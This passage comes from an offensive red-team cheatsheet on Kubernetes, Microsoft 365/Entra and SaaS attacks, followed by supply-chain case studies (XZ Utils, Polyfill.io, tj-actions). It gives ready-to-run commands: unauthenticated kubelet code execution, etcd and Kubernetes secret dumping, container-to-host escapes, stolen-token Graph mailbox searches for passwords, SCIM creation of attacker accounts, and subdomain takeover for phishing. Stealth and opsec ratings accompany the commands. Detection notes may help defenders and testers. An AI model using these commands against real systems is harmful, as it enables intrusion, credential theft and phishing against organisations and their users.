# KUBERNETES INITIAL ACCESS — EXTENDED
# MITRE ATT&CK: T1525 (Container Service Discovery), T1611 (Escape to Host),
#               T1610 (Deploy Container)
# STEALTH: VARIES (depends on K8s audit logging maturity)
# ═══════════════════════════════════════════════════════════

# ─── KUBELET 10250 vs API SERVER 6443 (cross-ref active recon §3.8) ─
# CRITICAL: kubelet (10250) anonymous access permitted historically;
# fine-grained kubelet authorization GA April 2026 in K8s v1.36
# Source: https://kubernetes.io/blog/2026/04/24/kubernetes-v1-36-fine-grained-kubelet-authorization-ga/
# Pre-1.36 production clusters STILL frequently allow unauthenticated
# kubelet access to /pods, /runningpods, /configz, /metrics, /exec

# Kubelet enumeration (no auth)
curl -sk https://target:10250/pods
curl -sk https://target:10250/runningpods
curl -sk https://target:10250/configz       # Leaks cluster CA, node config
curl -sk https://target:10250/metrics
curl -sk https://target:10250/healthz

# Kubelet /exec — UNAUTH RCE on misconfigured nodes (DESTRUCTIVE)
curl -sk -X POST "https://target:10250/exec/<ns>/<pod>/<container>?command=id&input=1&output=1&tty=1"

# Kubelet 10255 (deprecated read-only port; removed by default v1.16+;
# legacy clusters still expose)
curl -s http://target:10255/pods

# ─── API SERVER 6443 — typically authenticated ────────────
curl -sk https://target:6443/api               # Should return 401/403
curl -sk https://target:6443/api/v1/namespaces # 200 = critical misconfig
curl -sk https://target:6443/openapi/v2

# ─── ETCD (2379) — KUBERNETES BACKEND DATABASE ─────────────
# Critical impact if exposed; contains EVERY cluster secret
curl -sk https://target:2379/version
etcdctl --endpoints=http://target:2379 get / --prefix --keys-only
etcdctl --endpoints=http://target:2379 get /registry/secrets --prefix
etcdctl --endpoints=http://target:2379 get /registry/configmaps --prefix
# Modern K8s (v1.13+) requires mTLS by default; legacy / standalone etcd
# often unauth

# ─── EXPOSED DOCKER API (2375 unauth, 2376 TLS) ────────────
curl http://target:2375/containers/json
docker -H tcp://target:2375 run -v /:/mnt --rm -it alpine chroot /mnt bash
# (See active recon §3.8 for full Docker API enumeration depth)

# ─── POST-FOOTHOLD: K8s RBAC ENUMERATION ───────────────────
# From a compromised pod or with stolen kubeconfig:
kubectl auth can-i --list                          # All permissions
kubectl get clusterrolebindings                    # Cluster-wide bindings
kubectl get rolebindings --all-namespaces          # Namespace bindings
kubectl get clusterroles                           # Available cluster roles
kubectl get serviceaccounts --all-namespaces       # All service accounts

# ─── SA TOKEN THEFT FROM POD METADATA ──────────────────────
# From a compromised pod (T1552.007 — Container API):
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
# Use the token to authenticate against API server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces

# ─── PRIVILEGED CONTAINER ABUSE ────────────────────────────
# Containers with privileged: true or hostPID/hostNetwork can escape
# to host
# Discovery:
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | .metadata.name'
# Mount host filesystem:
# Inside privileged container:
mkdir /host && mount /dev/sda1 /host && chroot /host bash

# ─── KUBERNETES SECRETS EXTRACTION ─────────────────────────
kubectl get secrets --all-namespaces -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, data: .data}'
# Decode secret values:
kubectl get secret <name> -n <ns> -o json | jq -r '.data | map_values(@base64d)'

# ─── K8s SUPPLY CHAIN PIVOTS ───────────────────────────────
# Helm chart compromise (cross-ref §8 supply chain)
# Operator pattern: register similar-named Helm chart in artifact-hub.io
# → users installing typosquatted chart deploy attacker payload

# ─── DETECTION ─────────────────────────────────────────────
# - K8s API server audit logging (if enabled — many clusters don't enable
#   detailed audit by default)
# - Falco / Tetragon runtime security
# - Cloud-provider K8s audit integrations (EKS audit → CloudWatch,
#   AKS Diagnostic Settings, GKE Audit Logs)
# - CSPM K8s coverage: Wiz, Lacework, Orca, Sysdig
```

### 7.5 — Identity-Plane Post-Foothold (Token Replay Enumeration)

```bash
# ═══════════════════════════════════════════════════════════
# POST-FOOTHOLD IDENTITY-PLANE ENUMERATION
# MITRE ATT&CK: T1078.004, T1550 (Use Alternate Auth Material),
#               T1606.001 (Forge Web Credentials: Web Cookies)
# STEALTH: HIGH (legitimate token-based requests)
# ═══════════════════════════════════════════════════════════

# After AiTM (§2.1), help-desk-vishing (§2.3), or infostealer (§4.1):
# operator has stolen tokens / cookies. The following tools enumerate +
# operationalize that access at scale.

# ─── GraphRunner (DafThack — actively maintained) ──────────
# https://github.com/dafthack/GraphRunner
# Comprehensive Microsoft Graph post-cred attack tool
Import-Module ./GraphRunner.ps1
$tokens = Get-GraphTokens
Invoke-GraphRecon -Tokens $tokens                  # Tenant recon
Invoke-DumpApps -Tokens $tokens                    # Enumerate OAuth apps
Invoke-SearchSharePointAndOneDrive -Tokens $tokens \
                                   -SearchTerm "password"
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password"
Invoke-DumpOwaMailbox -Tokens $tokens -UserName victim@target.com

# ─── GraphSpy (browser-based) ──────────────────────────────
# https://github.com/RedByte1337/GraphSpy
# Browser-based Microsoft Graph attack tool with UI for token management
# Run locally; navigate to localhost:5000
graphspy

# ─── TokenSmith (token management framework) ───────────────
# https://github.com/jsa2/TokenSmith
# Token storage + replay framework

# ─── ROADtools (cross-ref §7.2) ────────────────────────────
# Some Graph endpoints used by `roadrecon gather` return 403 in 2026
# tenant configurations — verify per-tenant before relying on this path

# ─── AzureHound (cross-ref §7.2) ───────────────────────────
azurehound list --jwt <BEARER_TOKEN> -o azurehound.json

# ─── MICROSOFT GRAPH DIRECT QUERIES ────────────────────────
curl -s "https://graph.microsoft.com/v1.0/me" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/users?\$top=999" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/groups" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/applications" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/servicePrincipals" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/directoryRoles" -H "Authorization: Bearer $TOKEN"

# Sensitive scope grants enumeration
curl -s "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" -H "Authorization: Bearer $TOKEN"

# ─── OPERATIONAL PATTERN (TYPICAL POST-AITM CHAIN) ─────────
# 1. AiTM captures session cookie (§2.1)
# 2. Import cookie into attacker browser via Cookie-Editor extension
# 3. Authenticate to Microsoft 365 portal — verify session
# 4. Mint long-lived tokens via GraphSpy / GraphRunner
# 5. Enumerate via Graph: users, groups, OAuth apps, mailbox content
# 6. Pivot via OAuth grants to other SaaS (§7.6)
# 7. Optionally: register attacker app for persistence (cross-ref §04
#    Persistence cheatsheet)

# ─── DETECTION ─────────────────────────────────────────────
# - Defender for Cloud Apps: "Suspicious OAuth app activity"
# - MDCA: bulk download / mass mailbox search alerts
# - Entra ID Sign-in logs: anomalous user-agent + IP for token replay
# - Defender XDR: cross-product correlation (token replay + bulk SaaS
#   data access pattern)
```

### 7.6 — SaaS-to-SaaS OAuth Pivot

```
═══════════════════════════════════════════════════════════
SAAS-TO-SAAS OAUTH PIVOT (post-foothold expansion)
MITRE ATT&CK: T1550.001 (Application Access Token), T1199 (Trusted Rel)
STEALTH: VERY HIGH (legitimate OAuth grants between trusted SaaS)
SUCCESS: HIGH (heavy-SaaS orgs have dozens of cross-app grants)
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

MECHANISM:
  Compromise one SaaS (e.g., Slack, M365, Salesforce) → enumerate OAuth
  grants for the compromised user → pivot to other SaaS apps via OAuth
  refresh tokens. The chain bypasses target's IdP because OAuth grants
  are direct app-to-app trust relationships.

DOMINANT 2024-2026 CROSS-SAAS ATTACK VECTOR per Mandiant + Vectra
reporting. Heavy-SaaS orgs (typical: 50-200 distinct SaaS apps in use)
have wide attack surface for OAuth lateral movement.

ENUMERATION:
  After initial M365 foothold:
  curl -s "https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants" \
       -H "Authorization: Bearer $TOKEN"
  # Lists all OAuth grants for the current user

  GraphRunner:
  Invoke-DumpApps -Tokens $tokens
  # Enumerates all consented OAuth apps including delegated permissions

  After Slack foothold (with workspace token):
  curl -s "https://slack.com/api/users.identity" -H "Authorization: Bearer $SLACK_TOKEN"
  # Token grants access scoped per app installation

PIVOT PATTERNS:
  - M365 → Salesforce: OAuth grant for "Salesforce for Outlook" → use
    same identity to query Salesforce REST API
  - M365 → Atlassian: Atlassian Cloud SSO via Microsoft → access Jira /
    Confluence with refresh token
  - M365 → GitHub Enterprise Cloud: SAML federation → access user's
    repos via PAT or OAuth
  - Slack → ServiceNow: integration tokens for ticket creation +
    user-info queries
  - Workspace → Dropbox / Box: storage app integrations
  - Workspace → DocuSign: document workflow integration

POWER PLATFORM PIVOT (cross-ref §2.5):
  Compromised user with Power Automate access → create flow that runs
  with their delegated permissions across all connected SaaS:
  - Auto-forward email
  - Auto-mirror SharePoint to attacker OneDrive
  - Cross-SaaS data extraction without separate IdP auth

LOGIC APPS PIVOT (cross-ref §2.5):
  Logic Apps connectors persist across SaaS — compromised Logic Apps
  app provides standing connectors to dozens of enterprise SaaS

DETECTION:
  - Defender for Cloud Apps: "Suspicious OAuth app activity"
  - Defender XDR: new alerts Q1 2026 for SaaS-to-SaaS lateral pattern
  - Per-SaaS audit logs (Salesforce Event Monitoring, Slack Audit Logs,
    GitHub Audit Log) — fragmented but correlatable via SIEM
  - KQL hunt in §10.6

OPSEC RATING: VERY HIGH — token-based requests appear as legitimate
  user actions; cross-SaaS correlation requires mature SIEM (Sentinel,
  Splunk Enterprise Security, Cribl Stream-Searchable Pipeline) to catch.
```

### 7.7 — SCIM API Abuse for Cross-IdP Provisioning

```
═══════════════════════════════════════════════════════════
SCIM API ABUSE — CROSS-IdP USER PROVISIONING
MITRE ATT&CK: T1136.003 (Create Account: Cloud Account),
              T1098 (Account Manipulation), T1199
STEALTH: VERY HIGH (provisioning happens silently across federation)
SUCCESS: MED (depends on SCIM token leak / theft)
SKILL: HIGH
═══════════════════════════════════════════════════════════

MECHANISM:
  SCIM (System for Cross-domain Identity Management — RFC 7644) is the
  standard API for user/group sync between IdPs (Okta ↔ Workday, Entra
  ↔ Salesforce, Auth0 ↔ HRIS, etc.). SCIM endpoints frequently expose
  WRITE APIs protected by long-lived bearer tokens.

  Compromise of a SCIM bearer token enables silent user provisioning
  across all federated SaaS WITHOUT IdP audit visibility (because the
  provisioning happens via SCIM, not via IdP user-creation flow).

OBSERVED PATTERN (emerging 2025+):
  - Compromised IdP admin OR leaked SCIM secret → attacker provisions
    new user via SCIM into target's downstream SaaS apps
  - The new user appears in target's SaaS as legitimate (came through
    proper provisioning channel) but doesn't exist in source IdP
  - Detection lag: SaaS audit logs show user creation but source IdP
    shows no corresponding event

EXAMPLE — Salesforce SCIM provisioning:
  curl -X POST "https://target.my.salesforce.com/services/scim/v2/Users" \
       -H "Authorization: Bearer $SCIM_TOKEN" \
       -H "Content-Type: application/json" \
       -d '{
         "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
         "userName": "attacker.persona@target.com",
         "active": true,
         "emails": [{"value":"attacker@external.com","primary":true}]
       }'

EXAMPLE — Okta SCIM read (for enumeration):
  curl -s "https://target.okta.com/api/v1/scim/v2/Users" \
       -H "Authorization: Bearer $SCIM_TOKEN"

WHERE SCIM TOKENS ARE STORED (operator awareness):
  - IdP Admin Console (Okta Admin → Apps → SCIM Provisioning configuration)
  - Entra Admin Center (Enterprise applications → Provisioning)
  - HRIS systems (Workday, BambooHR, ADP) often have SCIM tokens for
    downstream provisioning
  - GitHub Enterprise has SCIM for cross-IdP user sync
  - Stored in: vendor admin consoles, Terraform state, Vault, sometimes
    in CI/CD environment variables (cross-ref §5 GitHub Code Search)

DETECTION:
  - SaaS audit logs: user creation via SCIM endpoint vs via IdP
  - SIEM correlation: new SaaS user without corresponding IdP event
  - SCIM token monitoring (rotation policies; inactive token alerts)
  - CSPM: SCIM-related misconfiguration detection (Wiz / Vectra
    Identity)

OPSEC RATING: VERY HIGH — silent provisioning channel; defender
  detection requires explicit cross-system correlation (rare in 2026
  even at mature shops).
```

### 7.8 — Subdomain Takeover for Phishing Infrastructure

```
═══════════════════════════════════════════════════════════
SUBDOMAIN TAKEOVER — TARGET'S OWN DOMAIN AS PHISHING HOST
MITRE ATT&CK: T1583.002 (Acquire Infrastructure: DNS Server) — adjacent
STEALTH: HIGH (attacker hosts on target's own subdomain)
SUCCESS: HIGH (target's own brand reputation)
SKILL: MEDIUM
═══════════════════════════════════════════════════════════

MECHANISM:
  Dangling DNS records (CNAME pointing to deprovisioned cloud resource)
  enable attackers to claim the resource and host arbitrary content.
  Phishing on target's own subdomain bypasses URL reputation entirely.

DISCOVERY (attacker workflow):
  1. Enumerate target's subdomains (passive recon §1.1)
  2. Resolve each subdomain — flag CNAMEs pointing to:
     - *.s3.amazonaws.com / *.s3-website-*.amazonaws.com
     - *.cloudfront.net
     - *.azurewebsites.net / *.azureedge.net
     - *.cloudapp.azure.com / *.trafficmanager.net
     - *.herokuapp.com / *.herokudns.com
     - *.github.io / *.github.com
     - *.shopify.com / *.myshopify.com
     - *.zendesk.com / *.helpscoutdocs.com
     - *.statuspage.io / *.statuspage.com
     - *.mybluehost.me / *.acquia-sites.com
     - *.fastly.net (some configurations vulnerable)
  3. For each candidate, check if the underlying resource exists:
     - For S3: aws s3api head-bucket --bucket <name>
     - For Heroku: HTTP request returns specific 404 page if app doesn't
       exist
     - For Azure: similar service-specific probe
  4. If 404 / "no such resource": you can claim it

TOOLS:
  - subjack — automated subdomain takeover detection
    subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v
  - Nuclei takeovers/ template family
    nuclei -l subdomains.txt -t takeovers/ -severity high
  - can-i-take-over-xyz (community-maintained vulnerable-CNAME database)
  - SubOver
  - HostileSubBruteforcer

CLAIMING THE RESOURCE:
  - For S3: aws s3 mb s3://<dangling-bucket-name> (in correct region)
  - For Heroku: heroku create <app-name>
  - For Azure App Service: az webapp create --name <name>
  - For GitHub Pages: create repo with gh-pages branch named <name>.github.io
  - For Shopify: register store with the dangling subdomain

ONCE CLAIMED:
  - Host phishing page on target.com subdomain (e.g., login.target.com,
    sso.target.com if dangling)
  - URL reputation: bypassed entirely (target's own domain)
  - Lookalike-domain detection: bypassed (it IS the domain)
  - Brand-monitoring services (e.g., PhishLabs, BrandShield): may not
    flag because the domain is target's own
  - DKIM / SPF inheritance for email (if MX dangling): bypasses email
    authentication

DETECTION (defender awareness):
  - Subdomain takeover monitoring services (HudsonRock, Detectify, RiskIQ
    DEASM)
  - DNS audit: regular CNAME-target validation
  - Some CSPM tools (Wiz, Lacework) detect dangling DNS in cloud-resource
    inventory

OPSEC RATING: HIGH — target's brand reputation works for the operator;
  detection lag is days-to-weeks for unmonitored dangling subdomains.
  RoE consideration: takeover modifies target's externally-visible
  surface; engagement must explicitly authorize.
```

### 7.9 — Mobile MDM / Device Enrollment Abuse

```
═══════════════════════════════════════════════════════════
MOBILE MDM / DEVICE ENROLLMENT ABUSE
MITRE ATT&CK: T1098.005 (Account Manipulation: Device Registration),
              T1078.004
STEALTH: HIGH (attacker device appears as legitimate enrolled device)
SUCCESS: MED (requires MDM admin compromise OR enrollment misconfig)
SKILL: HIGH
═══════════════════════════════════════════════════════════

MECHANISM:
  Mobile Device Management (MDM) platforms (Intune, Jamf, Workspace ONE,
  MobileIron / Ivanti Neurons, Kandji, Mosyle) enroll devices into
  organizational management. Enrolled devices receive:
  - Enterprise Wi-Fi credentials + VPN profiles
  - Email auto-configuration (M365, Workspace)
  - Internal app catalog distribution (corporate apps, browser extensions)
  - Conditional Access compliance verification

  Compromise of MDM admin OR enrollment misconfig → attacker enrolls
  attacker-controlled iOS/Android device → receives all the above as
  legitimate enrollment.

ATTACK VECTORS:
  1. MDM ADMIN COMPROMISE: phish/vish MDM admin → enroll attacker device
     via admin console (Intune Admin Center, Jamf Console)
  2. APPLE BUSINESS MANAGER / SCHOOL MANAGER ABUSE: ABM/ASM controls
     iOS device enrollment; compromised ABM admin can pre-stage attacker
     iPhone as "company-owned"
  3. GOOGLE ZERO-TOUCH ENROLLMENT: similar to ABM for Android; compromise
     of zero-touch admin → attacker device auto-enrolls
  4. ENROLLMENT TOKEN LEAK: enrollment URLs / QR codes / one-time tokens
     leaked via GitHub, internal docs (cross-ref §5 GitHub Code Search)

POST-ENROLLMENT CAPABILITIES:
  - VPN profile auto-config → direct VPN access without separate cred
    auth (config includes cert)
  - Email auto-config → access M365/Workspace mailbox via mobile client
  - Compliant device satisfies Conditional Access (CA) policy → Token
    Protection bypass
  - Enterprise app catalog → install internal apps that may have
    sensitive data access

DETECTION:
  - MDM admin audit log: device enrollment events with anomalous source
    IP / region
  - Apple ABM / Google ZTE audit logs
  - Conditional Access: compliance-eligible device with anomalous sign-in
    pattern
  - MDM compliance reports: identify devices enrolled but not actively
    used by an apparent owner

OPSEC RATING: HIGH at enrollment; detection shifts to behavioral anomaly
  on the enrolled device. Niche but high-value; primarily relevant for
  cellular-first / BYOD-heavy organizations.
```

```
═══════════════════════════════════════════════════════════
SECTION 7 (PART 2) — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §04 Persistence (cloud-side persistence via OAuth apps,
          SCIM provisioning, MDM enrollment, subdomain takeover)
Enables → §06 Lateral Movement (cross-tenant + cross-SaaS pivot)
Cross-ref → §1.1 subdomain takeover infrastructure path
Cross-ref → §2.5 OAuth consent (pre-foothold) vs §7.5 + §7.6 (post-foothold)
Cross-ref → §10.6 KQL detection queries for SaaS-to-SaaS pivot
NEVER → Use stolen tokens against personal-account scope without
        engagement RoE — token replay against personal Microsoft account
        endpoints (live.com, outlook.com) is unauthorized regardless of
        operator authorization for corporate target
```

---

## 8 — SUPPLY CHAIN & TRUSTED RELATIONSHIP

> **Typical chains through this section:** Identify strategic upstream dependency (OSS, vendor product, MSP, federation partner) → compromise via social engineering / token theft / dependency replacement → backdoor propagates to downstream targets → activate latent capability when operator decides. Two-year typical timeline for OSS social engineering; weeks for CI/CD action compromise.

### 8.1 — Software Supply Chain Overview

```
═══════════════════════════════════════════════════════════
SUPPLY CHAIN COMPROMISE (T1195)
MITRE ATT&CK: T1195.001 (Compromise Software Dependencies and Tools),
              T1195.002 (Compromise Software Supply Chain)
STEALTH: VERY HIGH (latent code in legitimate software)
SUCCESS: LOW per attempt; VERY HIGH impact when successful
SKILL: VERY HIGH
═══════════════════════════════════════════════════════════

CATEGORIES OF SUPPLY CHAIN COMPROMISE:

  A) UPSTREAM SOURCE COMPROMISE — modify legitimate software at the
     source (XZ Utils, SolarWinds, 3CX). Highest stealth, hardest to
     achieve, longest timeline. Usually requires social engineering of
     maintainer access OR supply-chain-of-supply-chain compromise (3CX
     was downstream of X_TRADER).

  B) DEPENDENCY REPLACEMENT — register typo-squatted or dependency-
     confusion package; downstream consumers pull it accidentally
     (PyPI / npm / RubyGems / Maven attacks). Lower stealth (defenders
     can SBOM-monitor); high volume.

  C) CDN / DELIVERY-PATH COMPROMISE — control the download URL even if
     source is unmodified (Polyfill.io). High stealth at runtime;
     detectable via SBOM monitoring.

  D) BUILD-PIPELINE COMPROMISE — modify CI/CD action / pipeline that
     produces the artifact (tj-actions). Production code unchanged;
     CI inserts payload. Detection: build provenance verification
     (SLSA, sigstore).

  E) DELIVERY MECHANISM COMPROMISE — sign legitimate but modified
     artifact via stolen code-signing cert; downstream consumers pull
     trusted-signed malware. (Operation Black Tulip / DigiNotar 2011
     pattern; ASUS Live Update 2019).

NATION-STATE / LONG-GAME EXAMPLES (chronological):
  - SolarWinds (APT29 / Cozy Bear, 2020) — trojanized Orion update; ~18k
    customers downloaded malicious build; persistent backdoor (SUNBURST).
  - 3CX (Lazarus Group, 2023) — trojanized desktop client; chained
    through earlier X_TRADER supply chain compromise.
  - XZ Utils / CVE-2024-3094 (March 2024) — full deep-dive in §8.2.
  - Polyfill.io (June 2024) — deep-dive in §8.3.
  - tj-actions/changed-files / CVE-2025-30066 (March 2025) — deep-dive
    in §8.4.
  - Codecov (2021) — compromised CI/CD bash uploader; ~30 customers'
    credentials exfiltrated.
  - MOVEit (CL0P, 2023) — CVE-2023-34362 mass exploitation of MOVEit
    Transfer servers hosted by vendors → downstream customer data theft.

COMMODITY / ECOSYSTEM EXAMPLES:
  - PyPI / npm typosquatting — "requets" instead of "requests", "colorama"
    variants
  - Malicious maintainer takeovers — abandoned package transferred to
    attacker; new malicious version published (event-stream 2018,
    ua-parser-js 2021, pattern continues)
  - Browser extension hijacks — malicious update to previously-benign
    extension after ownership transfer (Cyberhaven Dec 2024)

DETECTION:
  - Software composition analysis (SCA) — Snyk, GitHub Advanced Security,
    Mend, Black Duck, Sonatype Nexus IQ
  - SBOM (Software Bill of Materials) — SPDX / CycloneDX format
  - Build provenance — SLSA Level 3+, sigstore, in-toto
  - Reproducible builds — verify built artifact matches source
  - Code signing policy enforcement at install/update time
  - Dependency pinning audits + lockfile verification

OPSEC: Very high stealth pre-detection — code runs as part of legitimate
  software. Detection depends on SBOM quality, SCA tooling, build
  provenance. Well-instrumented targets (SLSA Level 3 build pipelines,
  sigstore verification, reproducible builds) detect anomalous
  dependency chains.
```

### 8.2 — XZ Utils Backdoor (CVE-2024-3094) — Long-Game Supply Chain

```
═══════════════════════════════════════════════════════════
XZ UTILS BACKDOOR — TEXTBOOK MODERN NATION-STATE TRADECRAFT
The defining supply chain event of 2024. Caught pre-distribution.
═══════════════════════════════════════════════════════════

A two-year social engineering campaign, subtle obfuscated binary payload
delivery via test fixtures, and a fallback-to-innocence discovery path
that came within weeks of shipping to production distributions.

TIMELINE (per Andres Freund's original disclosure, Wikipedia /
CrowdStrike / Akamai / Sonatype / JFrog analyses):
  - November 2021: GitHub account "JiaT75" (Jia Tan) created. Begins
    contributing small patches across multiple OSS projects, including
    an early malicious PR to libarchive (swapping safe_fprintf for
    unsafe fprintf) — likely credibility-building and/or simultaneous
    target expansion.
  - 2022: Sock-puppet accounts (Jigar Kumar, Dennis Ens, others) begin
    pressuring original xz maintainer Lasse Collin with aggressive
    "why aren't patches being applied faster" messaging, creating
    pressure to add a co-maintainer.
  - 2023: JiaT75 gains commit rights, then release manager rights.
    Changes project email in Google oss-fuzz tool to their personal
    Gmail (so vulnerability reports come to them first).
    Disables IFUNC support in fuzzer config (preparation for backdoor
    that uses IFUNC).
  - February 2024: xz 5.6.0 released containing the backdoor.
  - 9 March 2024: xz 5.6.1 released with fix for "anomalous behavior"
    that could have been detected during OS testing.
  - 29 March 2024: Andres Freund (PostgreSQL developer, Microsoft)
    reports the backdoor on the oss-security mailing list (Openwall)
    after investigating abnormal SSH login latency (~500ms vs ~100ms)
    and valgrind errors related to liblzma on Debian sid.
  - April 2024: CVE-2024-3094 assigned, CVSS 10.0. CISA advisory issued.

MECHANISM (how the backdoor worked):
  - Malicious binary payload embedded in obfuscated form inside test
    fixture files in xz repository (bad-3-corrupt_lzma2.xz,
    good-large_compressed.lzma)
  - Modified build script (build-to-host.m4, present only in release
    tarballs, NOT in git repo — avoiding review on commits) used `tr`
    to de-obfuscate and extract a shared object
    (liblzma_la-crc64-fast.o) during compilation
  - This shared object got compiled into liblzma, hooking the
    function-name resolution process via glibc's IFUNC mechanism
  - The hook replaced OpenSSH's RSA_public_decrypt with a malicious
    variant. OpenSSH normally doesn't link liblzma, but the common
    Debian/systemd-notify patch causes sshd to load libsystemd, which
    loads lzma — pulling the backdoored code into sshd
  - Upon receiving an SSH authentication request from a client bearing
    a specific Ed448 signature (verifying attacker owned the private
    key), the backdoor extracted a command from the client certificate
    and passed it to system() — pre-authentication RCE as root on any
    vulnerable sshd

AFFECTED TARGETS:
  - Fedora 41 and Rawhide (development branches)
  - Debian testing, unstable, experimental (sid)
  - Kali Linux (users who updated during specific March 2024 window)
  - openSUSE Tumbleweed (rolling)
  - Some macOS Homebrew users briefly
  - Red Hat Enterprise Linux: NOT affected (older xz version)
  - Debian stable: NOT affected (older xz version)

WHY IT MATTERS FOR OPERATOR AWARENESS:
  1. Long-game social engineering against OSS maintainers is a proven
     and validated APT technique. Any single-maintainer project used
     downstream in OpenSSH, Linux kernel, systemd, OpenSSL, or similar
     foundational libraries is a potential target. Defenders must
     threat-model dependency chains, not just vendor products.
  2. Release-tarball-vs-git-repo divergence is a blind spot. Code review
     on commits misses payload introduced only in published tarballs
     via autoconf m4 macros or similar build-time injection.
  3. Detection via performance anomaly (500ms latency) was fortuitous.
     Operators running similar tradecraft would face detection primarily
     via SBOM monitoring, dependency version alerts, and SSH behavioral
     anomalies. Absent those, this would have reached Debian stable and
     Ubuntu LTS within 6-12 months, backdooring tens of millions of
     production SSH servers.

DEFENSIVE RESPONSE:
  - Fedora, Debian, Red Hat, SUSE all reverted xz to safe versions
    within days. CISA issued advisory recommending rollback.
  - GitHub disabled the xz repository briefly, then restored under
    original maintainer control.
  - OSS-Fuzz added xz and liblzma back under community maintenance.
  - Industry response: renewed interest in OSS funding (Alpha-Omega,
    OpenSSF), SBOM mandates (US EO 14028 follow-through), reproducible
    builds adoption.

COMPARABLE CONTEMPORARY CAMPAIGNS TO WATCH FOR (operator awareness):
  - Any long-dormant maintainer account suddenly receiving pressure to
    add co-maintainers
  - Subtle build-script changes in release tarballs vs git repo
  - Sock-puppet issue filing patterns (pressure + alternative account
    proposing "solution" of new co-maintainer)
  - m4 macro / autotools / cmake changes that touch binary processing
```

### 8.3 — Polyfill.io (June 2024) — CDN Hijack at Scale

```
═══════════════════════════════════════════════════════════
POLYFILL.IO — JUNE 2024 — CDN HIJACK AT SCALE
100,000+ websites compromised; CDN-delivery-path supply chain
═══════════════════════════════════════════════════════════

  Source: https://www.sonatype.com/blog/polyfill.io-supply-chain-attack-hits-100000-websites-all-you-need-to-know

TIMELINE:
  - 2017-2024: polyfill.io was a popular CDN providing JavaScript
    polyfills (compatibility shims for old browsers). Embedded as
    `<script src="https://polyfill.io/v3/polyfill.min.js">` in 100,000+
    websites including major brands.
  - February 2024: Original maintainer Andrew Betts publicly recommended
    against using polyfill.io after the domain was sold to "Funnull",
    a Chinese company. He warned that no website needed polyfill in
    modern browsers.
  - 24 June 2024: Sonatype security researchers detected malicious code
    being served from polyfill.io to mobile users on specific websites.
  - 25-26 June 2024: Coordinated takedown response. Cloudflare and
    Fastly began serving alternative polyfill code to bypass the
    compromised domain. Google Ads stopped serving ads for sites using
    polyfill.io.
  - 27 June 2024: Funnull domain suspended.

MECHANISM:
  - The new polyfill.io owner served conditional malicious JavaScript
    based on:
    * User-Agent (only mobile users in some campaigns)
    * Referrer (only certain target websites)
    * Time of day (only certain hours)
  - Payload: redirect mobile users to scam / malware sites; injected
    crypto-jacking code; harvested form data
  - The conditional delivery made detection extremely difficult —
    website owners testing from desktop would see normal polyfill.io
    behavior

WHY IT MATTERS:
  1. CDN-delivery-path compromise: source code of the website was
     UNCHANGED. The website's developers couldn't see what changed in
     their own codebase. SBOM monitoring of source dependencies wouldn't
     catch this.
  2. The maintainer change (sale to a different entity) was the warning
     signal. Defenders should monitor for ownership changes in any
     external script / dependency.
  3. Conditional delivery: payload only served to specific user
     segments. Static analysis of the served code from defender labs
     wouldn't trigger; dynamic analysis from a different user-agent /
     referrer wouldn't see the payload.
  4. ~100,000 websites including major brands (JSTOR, Intuit, World
     Economic Forum, multiple Fortune-500) had embedded the script
     for years.

DETECTION (defender response):
  - Cloudflare / Fastly proactive replacement of polyfill.io with their
    own CDN-served version
  - Google Ads suspension of advertiser accounts using polyfill.io
  - Subresource Integrity (SRI) — cryptographic hash verification for
    script tags would have prevented the conditional payload from
    executing (most sites didn't use SRI)
  - Modern alternative: jsdelivr.com / unpkg.com hosted polyfill (not
    affiliated with the compromised polyfill.io domain)

OPERATOR LESSON: domain ownership changes for popular OSS infrastructure
are an under-monitored attack surface. Similar pattern applies to NPM
package ownership transfers, GitHub repository transfers, browser
extension ownership changes (cross-ref Cyberhaven Dec 2024).
```

### 8.4 — tj-actions/changed-files (March 2025) — CI/CD Action Compromise

```
═══════════════════════════════════════════════════════════
tj-actions/changed-files — MARCH 2025 — CVE-2025-30066
GitHub Actions compromise; 23,000 repositories impacted
═══════════════════════════════════════════════════════════

  Source: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction

TIMELINE:
  - tj-actions/changed-files: popular GitHub Action used by 23,000+
    repositories to detect file changes in PRs. Owned by a single
    maintainer (tj-actions org).
  - 10-15 March 2025: Compromised by attacker who modified the action
    to extract secrets from the GitHub Actions runner environment and
    print them in build logs.
  - 14-15 March 2025: Public PoC exploitation observed; CISA alert
    issued 18 March 2025.
  - Concurrent compromise: reviewdog/action-* family was also affected
    via the same attack chain (the attacker compromised a maintainer's
    PAT used across multiple action repos).

MECHANISM:
  - Attacker compromised GitHub Personal Access Token (PAT) belonging
    to a maintainer with write access to tj-actions/changed-files
  - Modified action source code to:
    1. Read environment variables (GitHub Secrets are exposed as env
       vars during action execution)
    2. Base64-encode the env-var dump
    3. Print to build log (visible to anyone with read access to the
       PR build output, including the attacker via the public action's
       log access)
  - When downstream repos used the latest tag of tj-actions/changed-
    files, their CI runs leaked all secrets to public GitHub Actions
    logs
  - Affected: any repo using tj-actions/changed-files@vN where N was
    the compromised tag; also reviewdog/action-* family

IMPACT:
  - 23,000+ GitHub repositories impacted per CISA
  - Leaked secrets included: AWS access keys, Docker Hub tokens,
    NPM tokens, GitHub PATs (creating cascade compromise potential),
    cloud service credentials
